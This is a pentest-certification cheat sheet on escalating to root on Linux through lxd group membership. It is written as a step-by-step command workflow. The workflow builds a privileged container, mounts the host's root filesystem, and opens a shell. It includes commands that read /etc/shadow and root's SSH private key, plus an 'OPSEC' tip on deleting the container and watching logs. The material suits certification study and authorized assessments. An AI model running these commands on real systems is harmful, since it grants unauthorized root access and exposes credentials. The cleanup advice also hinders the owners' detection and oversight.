🔐 Containers – CPTS Privilege Escalation Summary
High-level idea:
If you’re a member of the lxd or lxc group — you can bypass host protections and become root by mounting the host’s root filesystem into a privileged container.

🧠 What You’re Looking For
🔍 Run this first:

bash
Copy
Edit
id
✅ If output shows you're in the lxd group:

bash
Copy
Edit
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
🟢 You're in business. Time to escalate.

🧱 LXD Privilege Escalation: Step-by-Step
✅ Step 1 – Confirm Membership
bash
Copy
Edit
id | grep lxd
✅ Step 2 – Import a Writable Container Image
If ubuntu-template.tar.xz or similar is already available:

bash
Copy
Edit
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
If not, you can download and transfer a prebuilt image to the victim box:

Download from attacker box:
https://images.linuxcontainers.org

Upload using scp, wget, or python3 -m http.server

✅ Step 3 – Initialize a Privileged Container
bash
Copy
Edit
lxc init ubuntutemp privesc -c security.privileged=true
security.privileged=true disables all isolation. You're effectively root on host inside the container.

✅ Step 4 – Mount Host Filesystem
bash
Copy
Edit
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
This mounts the host’s / to /mnt/root inside the container.

✅ Step 5 – Start & Enter the Container
bash
Copy
Edit
lxc start privesc
lxc exec privesc /bin/bash
Inside the container:

bash
Copy
Edit
cd /mnt/root/root
cat /mnt/root/etc/shadow
cat /mnt/root/root/.ssh/id_rsa
🔥 You’re effectively root on the host. You can:

Copy SSH keys

Reset root password

Dump /etc/shadow

Edit crontabs, sudoers, etc.

🛡️ What Makes This Dangerous?
No password needed — just group membership

Mounting host FS gives full control

LXD group is often overlooked in hardening

Easy to automate and chain

⚠️ OPSEC Tip:
If you exploit this in a real-world assessment:

Clean up container afterward (lxc delete privesc --force)

Watch for logging in /var/log/lxd/

🔁 TL;DR Workflow
bash
Copy
Edit
# Check group
id | grep lxd

# Import container image
lxc image import ubuntu-template.tar.xz --alias ubuntutemp

# Create privileged container
lxc init ubuntutemp privesc -c security.privileged=true

# Mount host FS
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# Start and enter
lxc start privesc
lxc exec privesc /bin/bash
cd /mnt/root

Copy
Edit
IF user is in `lxd` group
    THEN import or upload an image
        AND initialize a privileged container
        AND mount host root
        AND execute shell
        THEN access /mnt/root as root on host
